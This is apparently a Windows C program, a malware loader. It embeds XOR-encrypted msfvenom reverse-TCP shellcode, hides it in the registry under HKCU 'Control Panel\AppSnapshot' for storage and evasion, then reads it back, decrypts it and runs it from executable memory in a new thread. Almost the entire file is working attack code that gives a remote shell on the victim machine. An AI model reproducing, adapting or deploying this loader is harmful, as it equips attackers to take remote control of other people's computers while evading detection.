#include <stdio.h>
#include <windows.h>
#define REGISTRY "Control Panel" 
#define REGSTRING "AppSnapshot"

// msfvenom -p windows/x64/shell_reverse_tcp lhost=eth0 lport=443 -f c
// xor encrypted shellcode 
unsigned char encrypted_result[] = { 0xA6, 0x12, 0xD9, 0xBE, 0xAA, 0xB2, 0x9A, 0x5A, 0x5A, 0x5A, 0x1B, 0x0B, 0x1B, 0x0A, 0x08, 0x0B, 0x0C, 0x12, 0x6B, 0x88, 0x3F, 0x12, 0xD1, 0x08, 0x3A, 0x12, 0xD1, 0x08, 0x42, 0x12, 0xD1, 0x08, 0x7A, 0x12, 0xD1, 0x28, 0x0A, 0x12, 0x55, 0xED, 0x10, 0x10, 0x17, 0x6B, 0x93, 0x12, 0x6B, 0x9A, 0xF6, 0x66, 0x3B, 0x26, 0x58, 0x76, 0x7A, 0x1B, 0x9B, 0x93, 0x57, 0x1B, 0x5B, 0x9B, 0xB8, 0xB7, 0x08, 0x1B, 0x0B, 0x12, 0xD1, 0x08, 0x7A, 0xD1, 0x18, 0x66, 0x12, 0x5B, 0x8A, 0xD1, 0xDA, 0xD2, 0x5A, 0x5A, 0x5A, 0x12, 0xDF, 0x9A, 0x2E, 0x3D, 0x12, 0x5B, 0x8A, 0x0A, 0xD1, 0x12, 0x42, 0x1E, 0xD1, 0x1A, 0x7A, 0x13, 0x5B, 0x8A, 0xB9, 0x0C, 0x12, 0xA5, 0x93, 0x1B, 0xD1, 0x6E, 0xD2, 0x12, 0x5B, 0x8C, 0x17, 0x6B, 0x93, 0x12, 0x6B, 0x9A, 0xF6, 0x1B, 0x9B, 0x93, 0x57, 0x1B, 0x5B, 0x9B, 0x62, 0xBA, 0x2F, 0xAB, 0x16, 0x59, 0x16, 0x7E, 0x52, 0x1F, 0x63, 0x8B, 0x2F, 0x82, 0x02, 0x1E, 0xD1, 0x1A, 0x7E, 0x13, 0x5B, 0x8A, 0x3C, 0x1B, 0xD1, 0x56, 0x12, 0x1E, 0xD1, 0x1A, 0x46, 0x13, 0x5B, 0x8A, 0x1B, 0xD1, 0x5E, 0xD2, 0x12, 0x5B, 0x8A, 0x1B, 0x02, 0x1B, 0x02, 0x04, 0x03, 0x00, 0x1B, 0x02, 0x1B, 0x03, 0x1B, 0x00, 0x12, 0xD9, 0xB6, 0x7A, 0x1B, 0x08, 0xA5, 0xBA, 0x02, 0x1B, 0x03, 0x00, 0x12, 0xD1, 0x48, 0xB3, 0x0D, 0xA5, 0xA5, 0xA5, 0x07, 0x13, 0xE4, 0x2D, 0x29, 0x68, 0x05, 0x69, 0x68, 0x5A, 0x5A, 0x1B, 0x0C, 0x13, 0xD3, 0xBC, 0x12, 0xDB, 0xB6, 0xFA, 0x5B, 0x5A, 0x5A, 0x13, 0xD3, 0xBF, 0x13, 0xE6, 0x58, 0x5A, 0x5B, 0xE1, 0x9A, 0xF2, 0x3A, 0xED, 0x1B, 0x0E, 0x13, 0xD3, 0xBE, 0x16, 0xD3, 0xAB, 0x1B, 0xE0, 0x16, 0x2D, 0x7C, 0x5D, 0xA5, 0x8F, 0x16, 0xD3, 0xB0, 0x32, 0x5B, 0x5B, 0x5A, 0x5A, 0x03, 0x1B, 0xE0, 0x73, 0xDA, 0x31, 0x5A, 0xA5, 0x8F, 0x0A, 0x0A, 0x17, 0x6B, 0x93, 0x17, 0x6B, 0x9A, 0x12, 0xA5, 0x9A, 0x12, 0xD3, 0x98, 0x12, 0xA5, 0x9A, 0x12, 0xD3, 0x9B, 0x1B, 0xE0, 0xB0, 0x55, 0x85, 0xBA, 0xA5, 0x8F, 0x12, 0xD3, 0x9D, 0x30, 0x4A, 0x1B, 0x02, 0x16, 0xD3, 0xB8, 0x12, 0xD3, 0xA3, 0x1B, 0xE0, 0xC3, 0xFF, 0x2E, 0x3B, 0xA5, 0x8F, 0x12, 0xDB, 0x9E, 0x1A, 0x58, 0x5A, 0x5A, 0x13, 0xE2, 0x39, 0x37, 0x3E, 0x5A, 0x5A, 0x5A, 0x5A, 0x5A, 0x1B, 0x0A, 0x1B, 0x0A, 0x12, 0xD3, 0xB8, 0x0D, 0x0D, 0x0D, 0x17, 0x6B, 0x9A, 0x30, 0x57, 0x03, 0x1B, 0x0A, 0xB8, 0xA6, 0x3C, 0x9D, 0x1E, 0x7E, 0x0E, 0x5B, 0x5B, 0x12, 0xD7, 0x1E, 0x7E, 0x42, 0x9C, 0x5A, 0x32, 0x12, 0xD3, 0xBC, 0x0C, 0x0A, 0x1B, 0x0A, 0x1B, 0x0A, 0x1B, 0x0A, 0x13, 0xA5, 0x9A, 0x1B, 0x0A, 0x13, 0xA5, 0x92, 0x17, 0xD3, 0x9B, 0x16, 0xD3, 0x9B, 0x1B, 0xE0, 0x23, 0x96, 0x65, 0xDC, 0xA5, 0x8F, 0x12, 0x6B, 0x88, 0x12, 0xA5, 0x90, 0xD1, 0x54, 0x1B, 0xE0, 0x52, 0xDD, 0x47, 0x3A, 0xA5, 0x8F, 0xE1, 0xAA, 0xEF, 0xF8, 0x0C, 0x1B, 0xE0, 0xFC, 0xCF, 0xE7, 0xC7, 0xA5, 0x8F, 0x12, 0xD9, 0x9E, 0x72, 0x66, 0x5C, 0x26, 0x50, 0xDA, 0xA1, 0xBA, 0x2F, 0x5F, 0xE1, 0x1D, 0x49, 0x28, 0x35, 0x30, 0x5A, 0x03, 0x1B, 0xD3, 0x80, 0xA5, 0x8F };

// xor function
void XorByOneKey(BYTE* pShellcode, SIZE_T sShellcodeSize, BYTE bKey) {
	size_t i = 0;
	for (i = 0; i < sShellcodeSize; i++) {
		pShellcode[i] = pShellcode[i] ^ bKey;
	}
}

BOOL WriteShellcodeToRegistry(IN PBYTE pShellcode, IN DWORD dwShellcodeSize) {

	BOOL        bSTATE = TRUE;
	LSTATUS     STATUS = NULL;
	HKEY        hKey = NULL;

	printf("[i] Writing 0x%p [ Size: %ld ] to \"%s\\%s\" ... ", pShellcode, dwShellcodeSize, REGISTRY, REGSTRING);

	STATUS = RegOpenKeyExA(HKEY_CURRENT_USER, REGISTRY, 0, KEY_SET_VALUE, &hKey);
	if (ERROR_SUCCESS != STATUS) {
		printf("[!] RegOpenKeyExA Failed With Error : %d\n", STATUS);
		bSTATE = FALSE; goto _EndOfFunction;
	}

	STATUS = RegSetValueExA(hKey, REGSTRING, 0, REG_BINARY, pShellcode, dwShellcodeSize);
	if (ERROR_SUCCESS != STATUS) {
		printf("[!] RegSetValueExA Failed With Error : %d\n", STATUS);
		bSTATE = FALSE; goto _EndOfFunction;
	}

	printf("[+] DONE ! \n");


_EndOfFunction:
	if (hKey)
		RegCloseKey(hKey);
	return bSTATE;
}

BOOL ReadShellcodeFromRegistry(IN DWORD sPayloadSize, OUT PBYTE* ppPayload) {

	LSTATUS     STATUS = NULL;
	DWORD       dwBytesRead = sPayloadSize;
	PVOID       pBytes = NULL;


	pBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sPayloadSize);
	if (pBytes == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d\n", GetLastError());
		return FALSE;
	}

	STATUS = RegGetValueA(HKEY_CURRENT_USER, REGISTRY, REGSTRING, RRF_RT_ANY, NULL, pBytes, &dwBytesRead);
	if (ERROR_SUCCESS != STATUS) {
		printf("[!] RegGetValueA Failed With Error : %d\n", STATUS);
		return FALSE;
	}

	if (sPayloadSize != dwBytesRead) {
		printf("[!] Total Bytes Read : %d ; Instead Of Reading : %d\n", dwBytesRead, sPayloadSize);
		return FALSE;
	}

	*ppPayload = reinterpret_cast<PBYTE>(pBytes);
	printf("size of ReadPaylaod %d\n", sizeof(*ppPayload));

	return TRUE;
}

BOOL RunShellcode(IN PVOID pDecryptedShellcode, IN SIZE_T sDecryptedShellcodeSize) {

	PVOID pShellcodeAddress = NULL;
	DWORD dwOldProtection = NULL;


	pShellcodeAddress = VirtualAlloc(NULL, sDecryptedShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pShellcodeAddress == NULL) {
		printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);

	memcpy(pShellcodeAddress, pDecryptedShellcode, sDecryptedShellcodeSize);

	// set pDecryptedShellcode to NULL
	memset(pDecryptedShellcode, '\0', sDecryptedShellcodeSize);

	if (!VirtualProtect(pShellcodeAddress, sDecryptedShellcodeSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("[#] Press <Enter> To Run ... ");
	getchar();

	HANDLE hThread = CreateThread(NULL, NULL, LPTHREAD_START_ROUTINE(pShellcodeAddress), NULL, NULL, NULL);
	//WaitForSingleObject(hThread, INFINITE);

	if (hThread == NULL) {
		printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("[#] Press enter to quit\n");
	getchar();

	return TRUE;
}

int main() {

	
	PBYTE pPayload;
	SIZE_T sePayloadSize = sizeof(encrypted_result);
	BYTE encryptionKey = 0x5A;

	if (!WriteShellcodeToRegistry(encrypted_result, sePayloadSize)) {
		printf("[!] WriteShellcodeToRegistry failed with %d\n", GetLastError());
		return FALSE;
	}

	if (!ReadShellcodeFromRegistry(sePayloadSize, &pPayload)) {
		printf("[!] ReadShellcodeFromRegistry failed with %d\n", GetLastError());
		return FALSE;
	}

	printf("[#] Press enter to Decrypt the Shellcode\n");
	getchar();
	printf("[i] Decrypting Shellcode [+] Done...\n");
	XorByOneKey(pPayload, sePayloadSize, encryptionKey);

	if (!RunShellcode(pPayload, sePayloadSize)) {
		printf("[!] RunShellcode failed with %d\n",GetLastError());
		return FALSE;
	}
	
	return TRUE;
}

